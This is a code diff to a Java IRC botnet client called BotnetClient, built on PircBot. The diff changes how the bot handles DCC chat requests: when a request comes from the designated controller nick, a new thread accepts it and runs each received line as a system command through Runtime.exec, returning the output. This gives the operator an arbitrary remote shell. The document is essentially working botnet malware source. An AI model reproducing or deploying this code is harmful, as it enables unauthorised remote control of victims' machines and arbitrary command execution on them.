@@ -15,7 +15,7 @@ public class BotnetClient extends PircBot {
 	private String id;
 	private Scanner input;
 	private String operator;
-	private DccChat chat;
+	private ChatThread chat;
 	
 	public static void main(String[] args) {
 		BotnetClient bn = new BotnetClient();
@@ -74,40 +74,61 @@ public class BotnetClient extends PircBot {
 	
 
 	protected void onIncomingChatRequest(DccChat chatObj) {
-		Runtime r = Runtime.getRuntime();
-		try {
-			System.out.println("." + chatObj.getNick() + ".");
-			System.out.println(chatObj.getNick().equalsIgnoreCase(CC));
-			if (chatObj.getNick().equalsIgnoreCase(CC)) {
-				System.out.println("in the if, about to accept chat");
-				chat = chatObj;
-				chat.accept();
-				System.out.println("Chat accepted");
-	        	chat.sendLine("$: ");
-	        	System.out.println("Sent response");
-	        	String command = chat.readLine();
-	        	System.out.println(command);
-	        	while (!command.equalsIgnoreCase("quit shell")) {
-	        		Process p = r.exec("ls -l .");
-	        		p.waitFor();
-	        		Scanner in = new Scanner(p.getInputStream());
-	        		String response = "";
-	        		while (in.hasNextLine()) {
-	        			response += in.nextLine() + "\n";
-	        		}
-	        		chat.sendLine(response + "\n$: ");
-	        		command = chat.readLine();
-	        	}
-	        	chat.close();
-			} else {
-				chat = null;
-			}
-	     } catch (Exception e) {
-	    	 e.printStackTrace();
-	     }
+		chat = new ChatThread(chatObj);
 	}
 	
 	public void write(String s) {
 		sendMessage(CHANNEL, s);
 	}
+	
+	private class ChatThread extends Thread {
+		DccChat chat;
+		public ChatThread(DccChat chat) {
+			this.chat = chat;
+			try {
+				if (chat.getNick().equalsIgnoreCase(CC)) {
+					chat.accept();
+				} else {
+					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
+				}
+			} catch(Exception e) {
+				System.out.println(e.getMessage());
+			}
+			this.start();
+		}
+		public void run() {
+			Runtime r = Runtime.getRuntime();
+			try {
+	        	chat.sendLine("$: ");
+	        	String command = chat.readLine();
+	        	System.out.println("Command: " + command);
+	        	while (!command.equalsIgnoreCase("quit shell")) {
+	        		Process p = r.exec(command);
+	        		Scanner in = new Scanner(p.getInputStream());
+	        		PrintWriter out = new PrintWriter(chat.getBufferedWriter());
+	        		p.waitFor();
+	        		String response = "";
+	        		while (in.hasNextLine()) {
+	        			response += in.nextLine() + "\n";
+	        		}
+	        		System.out.println(response);
+	        		out.print(response + "\n$: ");
+	        		command = chat.readLine();
+	        	}
+	        	chat.close();
+		     } catch (Exception e) {
+		    	 e.printStackTrace();
+		     }
+		}
+	}
 }
+/*
+
+M' = enc(json(M, mac, nonce))
+M = de-json(dec(M'))
+
+*/
+
+
+
+
